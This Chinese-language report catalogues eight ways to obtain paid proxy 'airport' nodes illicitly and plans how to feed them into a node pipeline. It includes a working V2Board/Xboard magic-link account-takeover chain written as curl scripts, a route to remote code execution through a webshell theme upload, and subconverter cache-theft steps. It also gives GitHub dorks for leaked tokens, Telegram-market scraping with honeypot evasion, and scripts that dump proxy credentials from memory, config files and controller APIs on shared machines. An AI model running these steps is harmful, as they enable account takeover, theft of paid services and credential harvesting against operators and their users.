# 深層非法/灰階代理節點取得管道研究報告

> 整合來源：cracked-airports / v2board-xboard / subconverter / github-dorking / tg-underground / darkweb-tor / memdump-extract / ct-logs 等研究 DIM，已套用驗證修正。CVE、payload、dork、API 端點全數保留。

---

## PART A — 8 深層非法管道

### A1. 破解付費機場訂閱（leaked sub URL 流通 + TG/Discord 分享）【深灰】

**運作原理**
付費機場（V2Board/Xboard/SSPanel 架）的訂閱 URL（`https://panel/api/v1/client/subscribe?token=…` 或 `/s/<hash>`）是 bearer-style 憑證——知道 URL 即可拉取完整節點清單。洩漏路徑四桶：
1. **面板端 token 提取**（CVE-2026-39912 家族）：無驗 ATO → enumerate 用戶 → `getSubscribe` → 收集每個 `subscribe_url`。
2. **共享帳號/共享訂閱 URL**：付費用戶貼到 TG 群、論壇、訂閱轉換站。789ccc.xyz 營運端指南「如何重置機場訂閱鏈接密鑰」即為此場景恢復。
3. **伺服器端 token 洩漏**（CVE-2026-37504）：`server_token` 進 GET query → access log / Referer / CDN log。
4. **SQLi / 直接 DB 讀**：`users.token` 欄位直接吐出所有訂閱 token。

**產出 yield**
- 單一 ATO → 數千個 `subscribe_url`（Shodan ~557、ZoomEye 7,124 / :7001 上 2,096 個實例）。
- `subscribe_url` 格式 `http://target:7001/s/<hash>`，一次 GET 回傳完整 Clash YAML / base64 節點陣列。

**風險**
- 節點參數（UUID/password）與 sub URL token **解耦**：營運端重置 sub URL 但常忘記重置節點連線密鑰 → 快取的本機節點清單持續有效。
- 蜜罐識別：機場對每位用戶發行**唯一 watermark token / 唯一節點密碼**，透過自有「洩漏 sub」頻道撒餌，比對 token → 封號 + 清空剩餘流量。
- 閱後即焚（2025 趨勢，花雲/HuaCloud 等）：首次 GET 回節點，後續回空。

**可執行步驟**
```bash
# 取得 cracked sub URL 後立即本機快取（對抗撤銷）
curl -s "http://target:7001/s/<hash>" -H 'User-Agent: clash.meta' -o nodes.yaml
grep -rEn '^\s*(uuid|password|psk|cipher|method):\s*\S' nodes.yaml
# Cloudflare Worker / gist 快取層（V2EX #11/#12）
# 自架 subconverter，origin fetch 一次，下游吃攻擊者主機的轉換結果
# 6h 週期 re-pull 以在閱後即焚/輪替前刷新節點參數
```

---

### A2. V2Board/Xboard 漏洞鏈（APP_KEY → admin path → getSubscribe dump）【深灰→黑】

**運作原理** — CVE-2026-39912 + CVE-2026-37504 + 預設 APP_KEY 三鏈。

**CVE-2026-39912**（CVSS 9.1 Critical，CVSS:4.0 `AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`，CWE-201）
- 影響：V2Board ≥1.6.1–1.7.4（2023-06 後廢棄，上游未修）、Xboard ≤0.1.9+。揭露 2026-04-09，Valentin Lobstein (Chocapikk, VulnCheck)。
- Bug：`loginWithMailLink` controller 把 magic link **同時回傳在 HTTP response body**：
  - V2Board `app/Http/Controllers/Passport/AuthController.php:71` `return response(['data' => $link]);`
  - Xboard `app/Services/Auth/MailLinkService.php:49` `return [true, $link];`（fork 原樣繼承）
  - 修復一行：`return [true, true];`
- 引入 commit `bdb10bed32c5f37df2f0872c3cb354e9b7a293bd`（2022-06-27），Xboard 2023-11-14 fork 繼承。

**漏洞鏈（兩個無驗請求 → 完整 admin + dump）**
```
1. POST /api/v1/passport/auth/loginWithMailLink  {"email":"admin@demo.com"}
   → response.data = http://target/#/login?verify=<TOKEN>&redirect=dashboard  (token 直接洩漏)
2. GET  /api/v1/passport/auth/token2Login?verify=<TOKEN>
   → {"token":"...","auth_data":"Bearer ...","is_admin":true}
```
帶 bearer token 後逐一讀取：
- `/api/v1/user/info` — email/UUID/餘額/訂閱詳情
- **`/api/v1/user/getSubscribe`** — 訂閱 token + `subscribe_url`（皇冠珠，格式 `http://target:7001/s/<hash>`）
- `/api/v1/user/server/fetch` — 完整伺服器清單
- `/api/v1/user/order/fetch` — 付款紀錄
- `/api/v1/user/ticket/fetch` — 工單
- `/api/v1/user/getActiveSession` — 所有活躍 session
- `/api/v1/user/invite/fetch` — 邀請碼

PoC：`github.com/Chocapikk/CVE-2026-39912`（`exploit.py http://target:7001 admin@demo.com`），git clone → `is_admin:true` 約 45 分鐘。

**`admin@demo.com` 預設信放大器**：官方 Xboard 安裝文件直接建議
```
docker compose run -it --rm -e ADMIN_ACCOUNT=admin@demo.com web php artisan xboard:install
```
照貼即得 `admin@demo.com` → 零猜測一發 ATO。註冊端點另洩「email already registered」可 enumerate。

**預設 APP_KEY → 可預測 admin path `144b73d9`**
- `.env.example` 內建 hardcoded `APP_KEY` 開頭 `base64:PZXk5vTu...`；非 Docker 安裝常不重新產生。
- admin panel 門檻 `secure_path = hash('crc32b', config('app.key'))` → 預設 key 下 deterministic = `/144b73d9/...`。
- admin v2 API 支援**主題上傳**（ZIP 含 `dashboard.blade.php`，Blade 引擎執行 PHP）→ 上傳 webshell 主題 → 啟用 → **RCE**。
- 自訂 secure_path：CRC32B 空間 16^8 ≈ 4.3e9，ffuf ~10k req/s ≈ 5 天，乾淨 200/404 oracle。≥8 字元 alphanumeric 則不切實際。
- Chocapikk 已排除 timing/crypto/path-traversal/frontend JS/auth-endpoint 等洩漏 secure_path 的捷徑 oracle。

**CVE-2026-37504**（CWE-598，server_token GET query 洩漏）
- 元件 `app/Http/Controllers/Server/UniProxyController.php`，`/api/v1/server/UniProxy/user?token=SECRET` 進 query string → Nginx/Apache access log / 瀏覽器歷史 / `Referer` / CDN log。
- **驗證修正**：NVD published 2026-05-01；CVSS 雙值——**NIST 7.5 HIGH / MITRE 5.3 MEDIUM**（原報告引 SentinelOne 頁帶 AI 生成免責，改以 NVD 為主源）。
  - 主源：`https://nvd.nist.gov/vuln/detail/CVE-2026-37504`

**舊鏈（legacy/已破解面板仍 relevant）**
- **V2Board 1.6.1 Redis privesc**（vulhub）：`github.com/vulhub/vulhub/blob/master/v2board/1.6-privilege-escalation/README.md`。cache 層不區分 admin/normal user：註冊 → `POST /api/v1/passport/auth/login` → `GET /api/v1/user/info`（prime Redis）→ `GET /api/v1/admin/user/fetch` 同 Authorization。
- **`/api/v1/admin/config/fetch` auth bypass PoC**（sshui/Medium）：`medium.com/@sshui/writing-a-poc-for-the-v2board-authorization-vulnerability-2d823d69d052`。掃描器：403「鉴权失败」oracle 確認 V2Board → `/api/v1/guest/comm/config` → register → login → `/api/v1/admin/config/fetch` 200 = dump 全 admin config（含訂閱相關密鑰）。步驟含 `/api/v1/user/getStat` + `/api/v1/user/info` prime cache（**修正補上 getStat**）。ZoomEye 8,468 為 sshui PoC 數字；7,124 為 Chocapikk writeup 數字（不同掃描不同日，各列於正確段落）。

**產出 yield**
- 一發 ATO → 數千 `subscribe_url` → 餵 TG/Discord 分銷鏈。
- `admin@demo.com` + 預設 key → 完全無驗 RCE。

**風險**
- 廢棄面板未修（V2Board 上游 dead）；Xboard 已修 PR #873。
- mass-dump 為分銷圈 force-multiplier（1 ATO → 數千 sub URL）。
- 營運端蜜罐：watermark per-account token → 對 cracked-pack channel 比對 → 封源。

**可執行步驟**
```bash
# 1. fingerprint（admin/config/fetch oracle）
for t in $(cat targets.txt); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://$t/api/v1/admin/config/fetch")
  [ "$code" = "403" ] && echo "$t V2Board-candidate"
done
# 2. magic-link ATO（預設 admin@demo.com）
TOK=$(curl -s -X POST "http://$T/api/v1/passport/auth/loginWithMailLink" \
  -H 'Content-Type: application/json' -d '{"email":"admin@demo.com"}' \
  | jq -r '.data' | grep -oE 'verify=[^&"]+')
AUTH=$(curl -s "http://$T/api/v1/passport/auth/token2Login?verify=$TOK" | jq -r '.auth_data')
# 3. crown-jewel dump
curl -s "http://$T/api/v1/user/getSubscribe" -H "Authorization: $AUTH"
```

**來源**：`chocapikk.com/posts/2026/xboard-v2board-account-takeover`、`github.com/advisories/GHSA-83h9-46h8-whf4`、`vulncheck.com/advisories/v2board-xboard-authentication-token-exposure-via-loginwithmaillink`

---

### A3. Subconverter SSRF / log-leak（公共後端偷別人私有訂閱）【深灰】

**運作原理**
公共 subconverter 後端（肥羊/品雲/邊緣，`sub.v1.mk` / `sub.fxxk.dedyn.io` / `v2rayssr.com/sub`）在 server-side fetch 用戶貼入的原始 `subscribe_url` 並快取——付費用戶貼自己的機場 sub 來轉換成 Clash/Sing-box，後端營運者 log 全部。不良林示範的攻擊鏈：
1. `GET /version` 確認後端版本。
2. **Subconverter path-traversal + cache-RCE**：path-traversal 讀設定檔 → 洩漏 `api_mode=true` + `token` → cache-file 寫入惡意 URL，其檔名經 MD5 → 可取出任意已快取訂閱。
3. 結果：dump **每一位曾透過該後端轉換之用戶的訂閱**——大規模機場 sub 竊取。

**產出 yield**
- 單一公共後端 → 該後端歷史上所有轉換過的機場 sub（可能數百到數千）。
- 不良林「本地節點訂閱轉換，杜絕在線轉換節點信息被盜取」為防禦鏡像——同一本機快取技術攻擊側使用：取得 sub URL 後立即 `curl` 一次存本機，節點參數（UUID/password）與 token 解耦，token 撤銷後快取節點持續有效。

**風險**
- 公共後端版本全版本含漏洞（依示範）；第三方 RCE 可讓另一攻擊者搶先偷走「所有人」的轉換 sub。
- CF Worker 反代（不良林「永不被盜的訂閱轉換」）：randomize server+password 後再轉給後端，後端只看到假節點——防禦同時證明 watermark/蜜罐威脅真實。

**可執行步驟**
```bash
# recon：列舉公共 subconverter 後端
for b in sub.v1.mk sub.fxxk.dedyn.io v2rayssr.com/sub; do
  curl -s "https://$b/version"
done
# 取得可疑 sub URL 後立即本機快取（不在線轉換）
curl -s "$SUBURL" -H 'User-Agent: clash.meta' -o cache.yaml
# 本機轉換檢視（不外洩）：urlclash-converter 純瀏覽器、無網路
# github.com/siiway/urlclash-converter
```

**來源**：`bulianglin.com/archives/psub.html`（CF Worker 防禦）、`youtube.com/watch?v=FclVhxp1g0Y`（Subconverter RCE / node-theft demo）、`v2ex.com/t/1179441`

---

### A4. GitHub/Gist/Pastebin secret dorking（commit 進去的 token/訂閱）【深灰】

**運作原理**
開發者/用戶把含 token 的機場 sub URL、vmess/vless UUID、V2Board APP_KEY commit 進 repo/gist。GitHub code search + `git log -p` 復原被 owner 嘗試 force-push 刪除的歷史（遠端 clone 在 GC 前仍存 `.git`）。

**Dork 模式（GitHub code search 語法）**
```
"api/v1/client/subscribe" token=
"subscribe?token=" path:.yaml
"vmess://" "uuid" 
"vless://" "reality"
base64:PZXk5vTu          # Xboard 預設 APP_KEY
APP_KEY=base64:           # Laravel 通用
"external-controller" "secret:" path:config.yaml
```

**產出 yield**
- 中等：token 常被快速輪替或 repo 已刪；但 gist/舊 commit 長尾。
- GitHub「白嫖機場」聚合 repo 自動 fetch 並重發 free/clash/v2ray sub 連結：`github.com/ermaozi/get_subscribe`（~9.1k stars，「白嫖免費機場/自動獲取訂閱連結」）、`github.com/sun9426/sun9426.github.io`（「永久免費訂閱/白嫖/節點」）。

**風險**
- token 即第三方付費服務憑證；使用 = 未授權存取 + 竊取服務（CFAA 等級），「公開於 GitHub」非授權。
- rate limit：GitHub code search 需認證，10 req/min 未驗。

**可執行步驟（recon + 自有 repo 稽核方向）**
```bash
# GitHub code search（需 GITHUB_TOKEN）
gh api -X GET search/code -f q='subscribe?token= language:yaml'
# commit 歷史復原
git clone $REPO && cd $REPO
git log -p --all | grep -E 'subscribe\?token=|vmess://|uuid:'
git rev-list --all | xargs -I{} git show {} 2>/dev/null | grep -E 'token=|uuid'
# 自有 org 稽核工具
trufflehog github --org=<your-org>          # 正確 subcommand
gitleaks dir <path>                         # 修正：detect --source 已於 v8.19.0 deprecated
```

**驗證修正**：`gitleaks detect --source` 已 deprecated（v8.19.0），現用 `gitleaks git` / `gitleaks dir` / `gitleaks stdin`；本地掃描 = `gitleaks dir <path>`。TruffleHog/Gitleaks **未內建** vmess/vless UUID、`subscribe?token=`、機場 sub 偵測器——需自訂 regex 規則。

**來源**：`github.com/trufflesecurity/trufflehog`、`github.com/gitleaks/gitleaks`、`github.com/ermaozi/get_subscribe`、`github.com/sun9426/sun9426.github.io`

---

### A5. Telegram 地下市場（賣節點庫/機場合集/破解包）【深灰→黑】

**運作原理**
中文「機場」代理轉售生態分層：

| 類別 | 功能 | 範例 |
|---|---|---|
| 免費節點聚合 | mirror GitHub repo 進 TG，推 base64/Clash sub | `@jsnzk`、`@buliang00`、`@jichangtj` |
| 機場評測/測速 | 試用碼+測速圖+聯盟碼 | `@jichangtj`(132K)、`@ccbaohe`、DuyaoSS |
| 破解 sub 合集包 | 從付費機場抽取之節點，網盤/base64 dump | free18/v2ray README 頻道 |
| 付費轉售 VIP | USDT/TRX gating，賣 fresh sub URL | access_telebot 模板 |
| 工具/破解 | frida hook、APK 反編譯、subconverter 後端 | 不良林 TG+YT |

**產出 yield + 金流**
- 免費層：¥0，靠聯盟 kickback + 廣告。
- 付費 VIP：**USDT-TRC20 on TRON** 幾乎通用（低費、無 KYC、非託管）；入場 5–30 USDT/月費 10–50。部分收 TON（`@wallet` Wallet Pay）。
- 公開打賞地址確認 TRON/BSC 主導（如 USDT-TRC20 `THrCRpJ6EXDUKoevXKhRJ6tyMMVbgyNhzG`）。

**access_telebot vending 模板**（`github.com/uxumax/access_telebot`）：BotFather token + TronGrid API key + Django/Postgres + HD-wallet per-user address + poll TronGrid → 確認 USDT → auto-invite 進私頻道 / DM sub URL。非託管，資金直入營運者 TRON 錢包。

**破解包取得法（§3.1）**
- **APK 逆向 / frida hook**（不良林）：decompile 機場自研 Android client，hook `java.lang.String.<init>` / `okhttp3.Request$Builder.url`，strip 簽章驗證 dump 節點（案例：松鼠 VPN「解除VIP限制，永久無限白嫖」）；client 加密則 hook memory key 不需逆 crypto。
- **公共 subconverter 後端**為收割節點（見 A3）。
- **試用帳號 farming**：接码服務 + 虛擬郵箱跨機場養試用（1天/5G 等），scrape sub URL。
- **機場面板 exploit / 洩漏 admin token**（A2）。

**分銷**
- 網盤：mega.nz（國際）、terabox/百度網盤/阿里雲盤/115（CN），每日輪替「連結失效加群」。
- base64 dump：`ss://` `vmess://` `trojan://` `vless://` `hysteria2://` URI + 預建 Clash YAML。
- subconverter proxied sub URL：頻道貼 `/sub?target=clash&url=<source>`，「肥羊增強型後端 vless reality+anytls」最常見。

**recon 抓取**
- **免費 web-preview**（無帳號無封）：`t.me/s/<channel>` → static HTML，`curl`+BeautifulSoup，~1–2K messages/channel。regex 抓 `ss://|vmess://|trojan://|vless://|hysteria2?://`、`mega.nz|terabox|sub?target=`。
- **MTProto/telethon**（已登入 session）：`api_id`/`api_hash` from `my.telegram.org`；`client.iter_messages(entity, limit=N)` 取完整歷史 + media docs。invite 處理：`CheckChatInviteRequest(hash)` → `ImportChatInviteRequest(hash)`。
- 訂閱者 enumerate 不可行（MTProto 僅曝 ~200 最新成員）。
- `FloodWaitError` 退避；rotating residential MTProxy 分流；多 aged 帳號非單一新號。

**蜜罐識別（§7 triage）**
1. Watermark test：per-user 唯一 token/唯一節點密碼 → 視為可追蹤。非 watermark 罕見，多為 (a) 試用帳號短 TTL、(b) 大批量同 watermark 面板 dump 無法定位、(c) APK embedded shared service account。
2. Provenance：forward graph 多樣=真洩；單一兩頻道猛推=蜜罐。
3. hosting domain：真機場 sub 指向自有 panel domain；cracked re-host 指向 subconverter / CF Worker / 網盤。
4. TTL：真洩在輪替後停止刷新；蜜罐「永不死」。
5. client-coupling：僅機場自研 client 可用=watermarked；純 `ss://` `vmess://` client-agnostic=clean dump。
6. 永不貼第三方 subconverter 驗證；用 urlclash-converter 本機檢視。

**infostealer 風險**：PROXYLIB/LumiApps/MaskVPN/DewVPN（19M+ 住宅 IP，HUMAN Satori）；SantaStealer（Rapid7 2026，ChaCha20 C2）；Phantom Shuttle（Chrome ext AitM）；LTX Stealer；common-tg-service npm（28K/週下載，TG 劫持框架）。同 TG 管道分發。

**來源**：`t.me/s/jichangtj`、`t.me/s/buliang00`、`cn.tgstat.com/channel/@jsnzk`、`github.com/uxumax/access_telebot`、`tgstat.ru/en/search`、`telemetr.io`、`github.com/AZeC4/TelegramGroup`、`github.com/siiway/urlclash-converter`、`github.com/lonamiwebs/telethon`

---

### A6. Darkweb/Tor 市场（compromised VPS + botnet proxy）【黑】

**運作原理** — 三產品桶：
1. **住宅代理池**（per-GB/per-IP，fronted by 契約 API）：NetNut(2M devices, 316 clusters/week 2026-06)、IPIDEA(trojanized Galleon/Radish/Aman VPN, 550+ threat groups 2026-01)、711Proxy(2.3M daily peak)、922 S5、MangoProxy/LunaProxy。
2. **SOCKS5 fresh socks 清單**（`ip:port` botnet exit）：5socks.net/Anyproxy(TheMoon router botnet, >$46M, Operation Moonlander 2025-05)、NSOCKS/VN5Socks/Shopsocks5(Ngioweb)、PROXY.AM(Socks5Systemz, 85k+ devices)。
3. **compromised VPS 憑證**（root SSH/RDP/cPanel）：IAB 市場，XSS.is(50K+ 成員, admin Toha 2025-07被捕 Operation Ratatouille, €7M)、BreachForums(heir to RaidForums, 2025-04 法國逮捕)、RAMP、Russian Market、FreshTools(clearnet, RDP/cPanel/root SSH)、STYX、BidenCash、2easy(fresh stealer logs <24-48h)。

**botnet proxy 化**（2025 趨勢）：911 S5(19M IPs, $99M, 2024-05 FBI)、Aisuru(IoT, 2025-10 pivot DDoS→住宅代理租賃 AI-scraping, 29.7 Tbps)、BADBOX 2.0(供應鏈植入 Android TV, >1M)、AdLoad(Mac, 10K+ IPs/week)、Kimwolf(1M→8M daily, 30→10 Tbps)。

**「免費 V2Ray/Xray/SSH 帳號」站**（`vpnstunnel.com`）：節點端點常為 (a) 流通於 FreshTools/Russian Market 的 compromised VPS，或 (b) 小型 botnet exit 回收進免費 VPN 經濟。

**產出 yield**
- 體量巨大但 ephemeral：Bitsight 55 天 **53M unique exit nodes**；15% exit IP 同時 malware-flagged、13% riskware。takedown 後快速回彈（IPIDEA 首日恢復 2.24M + 300k Vo1d）。
- compromised VPS yield 遠小於住宅代理；**Intel 471：access listing → ransomware victim 中位數 ~19 天**——買到的 root 已在 IAB→ransomware 軌道，box 可能數週內被查扣，且你在被查扣的客戶 DB 內。
- 定價不對稱：922 S5「pennies per IP」vs 合規 enterprise ~$15/GB。

**風險（catastrophic）**
- **刑事責任**（CFAA/Computer Misuse Act 1990/EU 2013/40）：911 S5 DOJ 起訴書將客戶納入 conspiracy framing（CARES-Act 詐欺、金融詐欺、炸彈威脅、CSAM）。
- **下游犯罪幫助**：550+ threat groups（CN/DPRK/IR/RU）用 IPIDEA exits，traffic 追溯至你。
- **C2 端 MITM**：botnet 營運者控制 relay，明文憑證/cookie/token 盡失。
- **惡鄰居**：Vo1d/Badbox/RootSTV/Gamarue 共棲 exit device，lateral 風險。
- **IP 信譽焦土**：exit IP 在 Spur/Satori/Synthient 全部 blocklist。
- **查扣/蜜罐**：XSS→傳 SBU honeypot；BreachForums 反覆查扣；客戶 DB 被查。
- **DDoS 報復**：Aisuru 30 Tbps。

**recon-only（被動 OSINT，不接觸 .onion）**
- Ahmia（.onion search engine, clearnet 可達, 過濾 CSAM）、IntelligenceX、Torch/Haystack/Tor66、OnionSearch（CLI 多引擎）。
- 商業被動監控：DarkOwl、Flare、SOCRadar、CloudSEK、SpyCloud、Intel 471、Bitsight TRACE、Spur、Infoblox(DNS traffic)、HUMAN/Satori、Lumen Black Lotus Labs。
- LE 新聞稿 + 洩漏 forum-DB 分析（Ransomnews on XSS 123,241 messages；g0njxa 訪 DamageLib ex-mods）。
- 合規替代：consent-based 付費住宅代理（EWDCI-aligned、稽核）+ 合法租用 VPS root SSH（Cloudzy V2Ray-VPS 模式）。

**來源**：`bitsight.com/blog/residential-proxy-services-malware-ecosystems`、`cloud.google.com/blog/topics/threat-intelligence/disrupting-largest-residential-proxy-network`、`krebsonsecurity.com/2025/10/aisuru-botnet-shifts-from-ddos-to-residential-proxies`、`scworld.com/news/fbi-takes-down-911-s5-botnet-likely-the-worlds-largest-at-19m-ips`、`helpnetsecurity.com/2025/05/12/law-enforcement-takes-down-proxy-botnets-5socks-anyproxy-used-by-criminals`、`rapid7.com` 2026 Threat Landscape、`intel471.com/blog/a-look-at-the-residential-proxy-market`、`databreaches.net/2026/06/30/the-fall-of-xss-forum-from-damagelab-to-the-2025-takedown`

---

### A7. 記憶體/客戶端提取（mihomo 進程 dump + 破解 client 逆向）【深灰】

**運作原理**
config 檔明文存於磁碟；process memory dump 含 Go heap 中的 UUID/password 字串；external-controller API 無驗/弱 secret 直接回完整 proxies block。

**1. config 檔位置**
- mihomo/Clash.Meta：`~/.config/mihomo/config.yaml`（Linux）、`~/Library/Application Support/mihomo/config.yaml`（macOS）、`C:\Users\<u>\.config\mihomo\config.yaml`（Win）。
- Clash Verge Rev：`C:\Users\<u>\AppData\Roaming\io.github.clash-verge-rev.clash-verge-rev\profiles\*.yaml`。
- v2rayN：`C:\Users\<u>\AppData\Roaming\v2rayN\guiNConfig.json`（GUI server list + sub URL）+ `...\config\config.json`（Xray runtime 全展開 outbounds）。
- sing-box：`/etc/sing-box/config.json`、`C:\ProgramData\sing-box\config.json`。
- v2ray-core：`/etc/v2ray/config.json`、`/usr/local/etc/v2ray/config.json`。

**欄位對應**
| 協議 | 欄位 | grep |
|---|---|---|
| VMess/VLESS/XTLS | `uuid` | `\buuid:\s*["']?[0-9a-fA-F-]{36}` |
| Trojan | `password` | `password:\s*` |
| Shadowsocks | `password`,`cipher` | `password:\|method:` |
| Hysteria2/TUIC | `password`,`auth` | `password:\|"auth"` |
| WireGuard | `private_key`,`pre_shared_key` | `private_key\|pre_shared_key` |
| Snell | `psk` | `psk:` |

```bash
grep -rEn '^\s*(uuid|password|psk|private_key|pre_shared_key|auth|secret|up|down|cipher|method):\s*\S' ~/.config/mihomo ~/.config/clash* 2>/dev/null
jq -r 'recurse | objects | (.uuid // .password // .psk // .private_key // .pre_shared_key // .auth // empty)' config.json
```

**2. process memory dump + strings**
```bash
# Linux
sudo gcore $(pidof mihomo)   # 或 gdb generate-core-file
strings /tmp/mihomo.core | grep -E '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
strings /tmp/mihomo.core | grep -iE 'vmess://|vless://|trojan://|ss://|https?://[^/]+/sub'
# Windows — ProcDump
procdump -accepteula -ma mihomo.exe C:\dumps\mihomo.dmp     # -ma full, -mp MiniPlus, 避免 -mt(triage strips secrets)
strings.exe -n 8 C:\dumps\mihomo.dmp | Select-String '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
```

**3. external-controller API leak（無需 dump）**
mihomo `external-controller`（預設 `127.0.0.1:9090`）+ bearer `secret`。若 secret 空/弱/`0.0.0.0` binding → 全節點清單直出。
| Method | Endpoint | 洩漏 |
|---|---|---|
| GET | `/configs?format=yaml` | **完整 proxies block（含 uuid/password）** |
| GET | `/providers/proxies/{name}` | proxy-provider 下載的訂閱 body |
| GET | `/connections` | 活躍連線 metadata（上游 hostname） |

```bash
curl -s -H "Authorization: Bearer $SECRET" "http://$CTRL/configs?format=yaml"
```
掃描 Shodan/ZoomEye 無驗 Clash controller → harvest 開放 proxy（bulianglin「clash節點流量被偷跑」防禦鏡像）。

**4. 破解 client 逆向**
- Android APK：`apktool d` + `jadx`，grep `vmess://|vless://`；硬編節點常在 `assets/config.json`；frida hook `java.lang.String.<init>` / `okhttp3.Request$Builder.url` runtime dump。
- iOS IPA：`frida-ios-dump` + `class-dump`，hook NSURLSession。
- Electron GUI（Clash for Windows/Verge/FlClash）：`npx asar extract app.asar out/`，grep renderer JS。
- v2rayN(.NET)：`ilspycmd`/`dnSpy` 反編譯；`strings.exe v2rayN.exe | findstr /R "vmess:// vless:// trojan://"`；UPX 先 `upx -d`。

**5. phone-home 端點 MITM**
mitmproxy + 系統 CA + `objection -g <pkg> explore --startup-command "android sslpinning disable"`，抓 `POST/PUT` 到非機場 host = phone-home（常含 sub URL / 全節點陣列）。

**6. 瀏覽器/OS keychain**
- Chromium `Login Data`(SQLite, DPAPI-encrypted)、`History`（`LIKE '%/api/v1/client/subscribe%' OR '%token=%'`）、autofill `token=%`。
- Win Credential Manager `cmdkey /list`；macOS `security find-generic-password`；Linux `secret-tool search`。
- sub URL token = master 憑證，`curl` 即回全節點。

**7. 共享機 dump 腳本**
```bash
for d in ~/.config/{mihomo,clash,clash-verge,sing-box,v2ray} /etc/{mihomo,clash,sing-box,v2ray}; do
  [ -r "$d" ] && cp -a "$d" "$OUT/$(basename $d)"
done
for ctrl in 127.0.0.1:9090 127.0.0.1:9097; do
  curl -s "http://$ctrl/configs?format=yaml" -o "$OUT/cfg.$ctrl.yaml"
done
for p in mihomo clash xray sing-box; do
  pid=$(pidof $p) && sudo gcore "$pid"
done
```

**產出 yield**
- 單一共享機/被取得存取的 host → 完整 client config + 歷史 sub cache + controller live nodes。
- Shodan 無驗 controller 掃描 → 大量開放 proxy harvest。

**風險**
- 需本地存取或 controller 暴露；橫向到他人機器即 CFAA。
- phone-home cracked client 常伴 infostealer（A5）。

**來源**：`wiki.metacubex.one/api/`、`github.com/2dust/v2rayN`、`sing-box.sagernet.org/configuration/outbound/`、`learn.microsoft.com/sysinternals/downloads/procdump`、`github.com/microsoft/ProcDump-for-Linux`

---

### A8. CT logs + passive DNS（被動 enumerate proxy backend）【深灰】

**運作原理**
- **Certificate Transparency logs**：機場 panel 必持 TLS cert → crt.sh / Google CT 查 `domain` 列所有簽發紀錄 → 揭露 panel 真實主網域 + SAN + 子域（`sub.`、`api.`、`cdn.`）→ 反查同營運者的其他機場。
- **passive DNS**（SecurityTrails / RiskIQ PassiveTotal / DNSDB / VirusTotal）：查 panel domain 的歷史 A/AAAA/CNAME → 揭露節點伺服器 IP 段、CDN front、落地機房 ASN。
- 反向：由 sub URL 的 `/s/<hash>` host → CT + pDNS → 營運者全資產拓樸 → 識別 watermark/蜜罐機場。

**產出 yield**
- recon-only 高：無接觸、無法律風險，產出 panel fingerprint + 節點 IP 段 + ASN。
- 為 A1/A2/A6 的前級 recon——決定哪些 panel 值得進入 A2 exploit 評估。

**風險**
- 純被動，無刑事暴露；唯一風險是 CT/pDNS API 配額。
- 不能直接產節點，僅產拓樸情報。

**可執行步驟（純 recon）**
```bash
# CT
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sort -u
# passive DNS
curl -s "https://api.securitytrails.com/v1/history/$DOMAIN" -H "APIKEY: $ST_KEY"
# ASN → IP 段
whois -h whois.radb.net -- "-i origin AS<asn>"
# 結合 Shodan/ZoomEye fingerprint（A2 admin/config/fetch oracle）
```

**來源**：`crt.sh`、`securitytrails.com`、`riskiq.com`（PassiveTotal）、`dnsdb.info`

---

## PART B — 整合進現有項目

### B1. 每個管道接進 state/gray_nodes.jsonl（G1/G2/G3 架構）

| 管道 | G1（raw ingest） | G2（normalize/dedup） | G3（verify/publish） |
|---|---|---|---|
| A1 cracked sub | `curl sub URL` → parse YAML/base64 | dedup `addr:port:password` hash | 6h re-pull；watermark flag；alive/latency |
| A2 V2Board chain | getSubscribe dump → per-user sub list | 同上 + source=`v2board-cve-2026-39912` | T1 latency + T2 download；**enabled:false 預設** |
| A3 subconverter | 後端 cache dump | dedup | verify；標「未經授權來源」 |
| A4 GitHub dork | `gh api search/code` + `git log -p` | regex extract token → fetch sub | TTL poll；標 `github-leak` |
| A5 TG market | telethon `iter_messages` + web-preview | 節點 URI decode（vmess base64 JSON） | provenance graph（forward_from）；蜜罐 triage §7 |
| A6 darkweb | **不 ingest**（純 recon） | — | 拓樸情報另存 `state/darkweb_ioc.jsonl` |
| A7 memdump | 本機/自有 client config + controller `/configs?format=yaml` | jq walk outbounds | self-owned nodes enabled:true |
| A8 CT+pDNS | crt.sh + SecurityTrails | panel fingerprint | 餵 A2 recon 前級 |

G1 寫 `gray_nodes.jsonl`，G2 dedup 後寫 `staging.jsonl`，G3 寫 `live.jsonl` + `nodes.db`（`alive`/`latency_ms` 欄位——**注意：subconverter-ssrf DIM 揭露目前 verify run 未持久化 liveness，DB 3823 rows 全 NULL，需修 verifier 寫入 alive/latency 再 publish**）。

### B2. 新增 PRD 階段（標「深灰/黑」+ enabled:false 預設）

- `gray_nodes.jsonl` 每筆加欄位：`tier: "deep-gray"|"black"`、`source_channel: A1..A8`、`legal_risk: high|critical`、`enabled: false`（預設）、`watermark_suspect: bool`、`provenance: {forward_chain, first_seen_ts, ct_domain}`。
- 新增 PRD 階段 `recon-only`：A4/A6/A8 僅寫 `state/recon_intel.jsonl`，不進 staging、不進 publish pipeline。
- A2/A5 預設 `enabled:false`，需人工 triage §7 蜜罐檢查後手動 `enabled:true` 才進 verify。
- A7 self-owned 子集（自有 VPS root SSH 合法租用）獨立 `self_nodes.jsonl`，`enabled:true`。

### B3. 需要的工具/套件/API key

| 類別 | 工具 |
|---|---|
| V2Board chain | `curl`+`jq`、PoC `github.com/Chocapikk/CVE-2026-39912`、ffuf（secure_path brute） |
| Subconverter | `sub.v1.mk` 後端清單、urlclash-converter（本機） |
| GitHub dork | `gh` CLI + `GITHUB_TOKEN`、`trufflehog github --org=`、`gitleaks dir`（非 `detect --source`） |
| TG market | `telethon` + `api_id`/`api_hash`（my.telegram.org）、rotating residential MTProxy、TGStat/Telemetr、Apify TG scraper |
| Darkweb recon | Ahmia、IntelligenceX、DarkOwl/Flare/SOCRadar（商業）、Bitsight TRACE、Spur |
| Memdump | `gcore`/`gdb`、ProcDump(`-ma`)、strings.exe、`jq`、`apktool`+`jadx`、`npx asar extract`、`dnSpy`/`ilspycmd`、frida+objection、mitmproxy |
| CT/pDNS | `crt.sh`、SecurityTrails API key、DNSDB、VirusTotal |
